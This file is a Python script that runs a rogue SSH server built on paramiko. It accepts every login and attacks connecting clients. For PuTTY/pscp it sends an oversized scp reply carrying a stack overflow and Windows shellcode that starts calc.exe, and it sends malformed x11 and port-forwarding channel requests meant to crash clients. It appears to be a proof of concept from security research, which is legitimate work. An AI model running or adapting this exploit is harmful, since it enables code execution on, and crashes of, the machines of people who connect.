#!/usr/bin/env python
# -*- coding: UTF-8 -*-

from binascii import hexlify
import socket
import sys
import threading
import re
import logging

try:
    import paramiko
except ImportError, ie:
    logging.exception(ie)
    logging.warning("Please install python-paramiko: pip install paramiko / easy_install paramiko / <distro_pkgmgr> install python-paramiko")
    sys.exit(1)
from paramiko.py3compat import b, u, decodebytes
from paramiko.ssh_exception import SSHException, ProxyCommandFailure
from paramiko.message import Message
from paramiko.common import cMSG_CHANNEL_OPEN, DEBUG, INFO
from paramiko.channel import Channel

from paramiko.transport import Transport
logging.basicConfig(format='%(levelname)-8s %(message)s',
                    level=logging.DEBUG)
LOG = logging.getLogger(__name__)


class SSHServer (paramiko.ServerInterface):
    # (using the "user_rsa_key" files)
    data = (b'AAAAB3NzaC1yc2EAAAABIwAAAIEAyO4it3fHlmGZWJaGrfeHOVY7RWO3P9M7hp'
            b'fAu7jJ2d7eothvfeuoRFtJwhUmZDluRdFyhFY/hFAh76PJKGAusIqIQKlkJxMC'
            b'KDqIexkgHAfID/6mqvmnSJf0b5W8v5h2pI/stOSwTQ+pxVhwJ9ctYDhRSlF0iT'
            b'UWT10hcuO4Ks8=')
    good_pub_key = paramiko.RSAKey(data=decodebytes(data))

    def __init__(self):
        self.event = threading.Event()
        self.peers = set([])

    def check_channel_request(self, kind, chanid):
        LOG.info("REQUEST: CHAN %s %s"%(kind,chanid))
        if kind == 'session':
            return paramiko.OPEN_SUCCEEDED
        return paramiko.OPEN_FAILED_ADMINISTRATIVELY_PROHIBITED

    def check_auth_password(self, username, password):
        LOG.info("REQUEST: CHECK_AUTH_PASS %s %s"%(repr(username),password))
        LOG.info("* SUCCESS")
        return paramiko.AUTH_SUCCESSFUL

    def check_auth_publickey(self, username, key):
        LOG.info("REQUEST: CHECK_AUTH_PUBK %s %s (fp: %s)"%(repr(username),repr(key),hexlify(key.get_fingerprint())))
        LOG.info("* SUCCESS")
        return paramiko.AUTH_SUCCESSFUL
    
    def check_auth_gssapi_with_mic(self, username,
                                   gss_authenticated=paramiko.AUTH_FAILED,
                                   cc_file=None):
        LOG.info("REQUEST: CHECK_AUTH_GSSAPI_MIC %s %s (fp: %s)"%(repr(username),gss_authenticated,cc_file))
        LOG.info("* SUCCESS")
        return paramiko.AUTH_SUCCESSFUL

    def check_auth_gssapi_keyex(self, username,
                                gss_authenticated=paramiko.AUTH_FAILED,
                                cc_file=None):
        LOG.info("REQUEST: CHECK_AUTH_GSSAPI_KEY %s %s (fp: %s)"%(repr(username),gss_authenticated,cc_file))
        return paramiko.AUTH_SUCCESSFUL

    
    def check_channel_x11_request(self, channel, single_connection, auth_protocol, auth_cookie, screen_number):
        LOG.info("X11Req %s, %s, %s, %s, %s"%(channel, single_connection, auth_protocol, auth_cookie, screen_number))
        return True
    
    def check_channel_shell_request(self, channel):
        LOG.info("SHELL %s"%repr(channel))
        self.event.set()
        return True
    
    def check_channel_exec_request(self, channel, command):
	shellcode  = ("\xeb\x16\x5b\x31\xc0\x50\x53\xbb\xad\x23\x86\x7c\xff\xd3\x31\xc0"
"\x50\xbb\xfa\xca\x81\x7c\xff\xd3\xe8\xe5\xff\xff\xff\x63\x61\x6c"
"\x63\x2e\x65\x78\x65\x00")
	jmpesp = ''
	badchar = '\x90'*50+'\xcc'*20
        LOG.info("REQUEST: EXEC %s %s"%(channel,command))
        transport =  channel.get_transport()
        try:
            if "putty" in transport.CONN_INFO['client'].lower() \
                and "scp -f" in command:
                LOG.warning("Oh, hello putty/pscp %s, nice to meet you!"%transport.CONN_INFO['client'])
                # hello putty
                # putty pscp stack buffer overwrite, EIP
                rep_time = "T1444608444 0 1444608444 0\n"
                rep_perm_size = "C755 %s \n"%('A'*76+'\x12\x45\xfa\x7f'+ shellcode + '\x90'*30)
                LOG.info("send (time): %s"%repr(rep_time))
                channel.send(rep_time)
                LOG.info("send (perm): %s"%repr(rep_perm_size))
                channel.send(rep_perm_size)
                LOG.info("boom!")
        except ValueError: pass
        
        return True
    
    def enable_auth_gssapi(self):
        UseGSSAPI = False
        GSSAPICleanupCredentials = False
        return UseGSSAPI

    def get_allowed_auths(self, username):
        auths = 'gssapi-keyex,gssapi-with-mic,password,publickey'
        LOG.info("REQUEST: allowed auths: %s"%(auths))
        return auths
    
    def set_host_key(self, host_key):
        self.host_key = host_key
        LOG.info('ServerHostKey: %s'%u(hexlify(host_key.get_fingerprint())))
    
    def listen(self, bind, host_key=None):
        self.bind = bind
        
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        LOG.info("BIND: %s"%repr(bind))
        self.sock.bind(bind)
        self.sock.listen(100)
        LOG.info('Listening for connection ...')

    def accept(self, ):
        client, addr = self.sock.accept()
        LOG.info('new peer: %s'%repr(addr))
        peer = SSHPeerSession(self, client, addr, host_key=self.host_key)
        self.peers.add(peer)
        return peer

class SSHPeerSession(object):
    def __init__(self, server, client, addr, host_key, DoGSSAPIKeyExchange=False):
        self.server, self.client, self.addr = server, client, addr
        self.DoGSSAPIKeyExchange = DoGSSAPIKeyExchange
        self.host_key = host_key
        self.prompt = {}
        
        self.transport = paramiko.Transport(client, gss_kex=DoGSSAPIKeyExchange)  
        self.transport.set_gss_host(socket.getfqdn("."))
        try:
            self.transport.load_server_moduli()
        except:
            LOG.error('(Failed to load moduli -- gex will be unsupported.)')
            raise
        self.transport.add_server_key(self.host_key)
        self.transport.start_server(server=self.server)

    def accept(self, timeout):
        chan = self.transport.accept(timeout)
        if chan is None:
            raise Exception("No channel")
        return chan
    
    def wait(self, timeout):
        LOG.info("wait for event")
        self.server.event.wait(10)
                
class FakeShell(object):
    def __init__(self, peer, channel):
        self.peer = peer
        self.channel = channel
        self.prompt = {'username': peer.transport.get_username().strip(),
                       'host':peer.addr[0],
                       'port':peer.addr[1]}
        
    def banner(self):
        self.channel.send('\r\n\r\nHi %(username)s!\r\n\r\ncommands: echo, allchars, x11exploit, directtcpip, forwardedtcpipcrash\r\nother: pscp crash with: pscp -scp -P %(port)d %(username)s@%(host)s:/etc/passwd .\r\n\r\n'%self.prompt)
        
    def loop(self):
        f = self.channel.makefile('rU')
        while True:
            self.channel.send('%(username)s@%(host)s:~# '%self.prompt)
            cmd = ""
            while not (cmd.endswith("\r") or cmd.endswith("\n")):
                self.peer.server.event.wait(10)
                if not self.peer.server.event.is_set():
                    LOG.error('Peer did not ask for a shell within 10 seconds.')
                    sys.exit(1)
                chunk = f.read(1) #.strip('\r\n')
                if not chunk:
                    continue
                cmd +=chunk
      
            LOG.debug("<== %s"%repr(cmd))
            cmdsplit = cmd.split(" ",1)
            args = ''
            cmd = cmdsplit[0].strip()
            if len(cmdsplit)>1:
                args = cmdsplit[1].strip()
            
            if cmd=="exit":
                break
            try:
                getattr(self, "cmd_%s"%cmd)(cmd, args)
            except AttributeError, ae:
                resp = "- Unknown Command: %s\r\n"%cmd
                LOG.debug("==> %s"%repr(resp))
                self.channel.send(resp)
                
    def cmd_echo(self, cmd, args):
        resp = "%s\r\n"%args
        LOG.debug("==> %s"%repr(resp))
        self.channel.send(resp)
        
    def cmd_allchars(self, cmd, args):
        resp = ''.join(chr(c) for c in xrange(256))
        LOG.debug("==> %s"%repr(resp))
        self.channel.send(resp)
    
    def cmd_x11serverinitiated(self, cmd, args):
        resp = self.peer.transport.open_channel(kind="x11", src_addr=("192.168.139.129",1), dest_addr=("google.com",80))
        LOG.debug("==> chan: %s"%repr(resp))
    
    def cmd_x11exploit(self, cmd, args):
        resp = self.peer.transport.open_channel(kind="x11exploit", src_addr=("1.1.1.1",1), dest_addr=("1.1.1.1",2))
        LOG.debug("==> chan: %s"%repr(resp))
        
    def cmd_directtcpip(self, cmd, args):
        resp = self.peer.transport.open_channel(kind="direct-tcpip", src_addr=("1.1.1.1",1), dest_addr=("1.1.1.1",2))
        LOG.debug("==> chan: %s"%repr(resp))
    
    def cmd_forwardedtcpipcrash(self, cmd, args):
        resp = self.peer.transport.open_channel(kind="forwarded-tcpip", src_addr=("1.1.1.1",1), dest_addr=("1.1.1.1",2))
        LOG.debug("==> chan: %s"%repr(resp))
        
    def cmd_ls(self, cmd, args):
        resp = """total 96
4 -rw-------  1 user user    383 Feb 29 16:48 .bash_history
4 drwx------ 12 user user   4096 Feb 29 16:45 .cache
4 drwx------  4 user user   4096 Feb 29 16:43 .mozilla
4 drwxr-xr-x 18 user user   4096 Feb 29 16:43 .
4 drwxr-xr-x  2 user user   4096 Feb 29 16:43 Pictures
4 drwx------  3 user user   4096 Feb 29 16:43 .gnome2
4 drwx------  2 user user   4096 Feb 29 16:43 .gnome2_private
4 drwxr-xr-x 13 user user   4096 Feb 29 16:42 .config
4 drwx------  3 user user   4096 Feb 29 16:41 .gconf
4 -rw-------  1 user user    636 Feb 29 16:41 .ICEauthority
4 drwx------  3 user user   4096 Feb 29 16:35 .local
4 drwxr-xr-x  2 user user   4096 Feb 29 16:35 Desktop
4 drwxr-xr-x  2 user user   4096 Feb 29 16:35 Documents
4 drwxr-xr-x  2 user user   4096 Feb 29 16:35 Downloads
4 drwxr-xr-x  2 user user   4096 Feb 29 16:35 Music
4 drwxr-xr-x  2 user user   4096 Feb 29 16:35 Public
4 drwxr-xr-x  2 user user   4096 Feb 29 16:35 Templates
4 drwxr-xr-x  2 user user   4096 Feb 29 16:35 Videos
4 drwx------  3 user user   4096 Feb 29 16:35 .dbus
4 -rw-r--r--  1 user user    220 Feb 29 16:34 .bash_logout
4 -rw-r--r--  1 user user   3391 Feb 29 16:34 .bashrc
4 -rw-r--r--  1 user user   3515 Feb 29 16:34 .bashrc.original
4 -rw-r--r--  1 user user    675 Feb 29 16:34 .profile
4 drwxr-xr-x  3 root   root 4096 Feb 29 16:34 ..
""".replace('\n','\r\n')
        LOG.debug("==> %s"%repr(resp))
        self.channel.send(resp)
                
# taken from transport.open_channel
def open_channel_exploit(self,
                 kind,
                 dest_addr=None,
                 src_addr=None,
                 window_size=None,
                 max_packet_size=None):
    """
    Request a new channel to the server. `Channels <.Channel>` are
    socket-like objects used for the actual transfer of data across the
    session. You may only request a channel after negotiating encryption
    (using `connect` or `start_client`) and authenticating.

    .. note:: Modifying the the window and packet sizes might have adverse
        effects on the channel created. The default values are the same
        as in the OpenSSH code base and have been battle tested.

    :param str kind:
        the kind of channel requested (usually ``"session"``,
        ``"forwarded-tcpip"``, ``"direct-tcpip"``, or ``"x11"``)
    :param tuple dest_addr:
        the destination address (address + port tuple) of this port
        forwarding, if ``kind`` is ``"forwarded-tcpip"`` or
        ``"direct-tcpip"`` (ignored for other channel types)
    :param src_addr: the source address of this port forwarding, if
        ``kind`` is ``"forwarded-tcpip"``, ``"direct-tcpip"``, or ``"x11"``
    :param int window_size:
        optional window size for this session.
    :param int max_packet_size:
        optional max packet size for this session.

    :return: a new `.Channel` on success

    :raises SSHException: if the request is rejected or the session ends
        prematurely

    .. versionchanged:: 1.15
        Added the ``window_size`` and ``max_packet_size`` arguments.
    """
    if not self.active:
        raise SSHException('SSH session not active')
    self.lock.acquire()
    try:
        window_size = self._sanitize_window_size(window_size)
        max_packet_size = self._sanitize_packet_size(max_packet_size)
        chanid = self._next_channel()
        m = Message()
        m.add_byte(cMSG_CHANNEL_OPEN)
        m.add_string("x11" if kind == "x11exploit" else kind)
        m.add_int(chanid)
        m.add_int(window_size)
        m.add_int(max_packet_size)
        if (kind == 'forwarded-tcpip') or (kind == 'direct-tcpip'):
            m.add_string(dest_addr[0])
            m.add_int(dest_addr[1])
            m.add_string(src_addr[0])
            m.add_int(src_addr[1])
        elif kind == 'x11':
            m.add_string(src_addr[0])
            m.add_int(src_addr[1])
        elif kind =='x11exploit':
            m.add_int(99999999)
            m.add_bytes('')
            m.add_int(src_addr[1])
        chan = Channel(chanid)
        self._channels.put(chanid, chan)
        self.channel_events[chanid] = event = threading.Event()
        self.channels_seen[chanid] = True
        chan._set_transport(self)
        chan._set_window(window_size, max_packet_size)
    finally:
        self.lock.release()
    self._send_user_message(m)
    while True:
        event.wait(0.1)
        if not self.active:
            e = self.get_exception()
            if e is None:
                e = SSHException('Unable to open channel.')
            raise e
        if event.is_set():
            break
    chan = self._channels.get(chanid)
    if chan is not None:
        return chan
    e = self.get_exception()
    if e is None:
        e = SSHException('Unable to open channel.')
    raise e

# taken from transport._check_banner
def _check_banner_track_client_version(self):
    # this is slow, but we only have to do it once
    for i in range(100):
        # give them 15 seconds for the first line, then just 2 seconds
        # each additional line.  (some sites have very high latency.)
        if i == 0:
            timeout = self.banner_timeout
        else:
            timeout = 2
        try:
            buf = self.packetizer.readline(timeout)
        except ProxyCommandFailure:
            raise
        except Exception as e:
            raise SSHException('Error reading SSH protocol banner' + str(e))
        if buf[:4] == 'SSH-':
            break
        self._log(DEBUG, 'Banner: ' + buf)
    if buf[:4] != 'SSH-':
        raise SSHException('Indecipherable protocol version "' + buf + '"')
    # save this server version string for later
    self.remote_version = buf
    # pull off any attached comment
    comment = ''
    i = buf.find(' ')
    if i >= 0:
        comment = buf[i+1:]
        buf = buf[:i]
    # parse out version string and make sure it matches
    segs = buf.split('-', 2)
    if len(segs) < 3:
        raise SSHException('Invalid SSH banner')
    version = segs[1]
    client = segs[2]
    if version != '1.99' and version != '2.0':
        raise SSHException('Incompatible version (%s instead of 2.0)' % (version,))
    self._log(INFO, 'Connected (version %s, client %s)' % (version, client))
    self.CONN_INFO ={'client':client, 'version':version}                        # track client version


def start_server(bind, host_key=None):
        server = SSHServer()
        server.set_host_key(paramiko.RSAKey(filename='test_rsa.key'))
        server.listen(bind)
        try:
            peer = server.accept()
        except paramiko.SSHException:
            LOG.error('SSH negotiation failed.')
            sys.exit(1)
        
        # wait for auth / async.
        chan = peer.accept(20)
        LOG.info("Authenticated!")

        LOG.info("wait for event")
        peer.wait(10)
        if not server.event.is_set():
            LOG.error('Peer did not ask for a shell within 10 seconds.')
            sys.exit(1)
            
        # most likely waiting for a shell
        LOG.info("spawn vshell")
        vshell = FakeShell(peer, chan)
        vshell.banner()
        vshell.loop()
        vshell.channel.close()

if __name__=="__main__":  
    LOG.setLevel(logging.DEBUG)
    LOG.info("monkey-patch paramiko.Transport.open_channel")
    paramiko.Transport.open_channel = open_channel_exploit
    LOG.info("monkey-patch paramiko.Transport._check_banner")
    paramiko.Transport._check_banner = _check_banner_track_client_version
    LOG.info("--start--")
    DoGSSAPIKeyExchange = False
    arg_bind = sys.argv[1].split(":") if len(sys.argv)>1 else ("0.0.0.0","22")
    bind = (arg_bind[0], int(arg_bind[1]))    
    try:
        start_server(bind)
    except Exception as e:
        LOG.exception('Exception: %s'%repr(e))
        sys.exit(1)
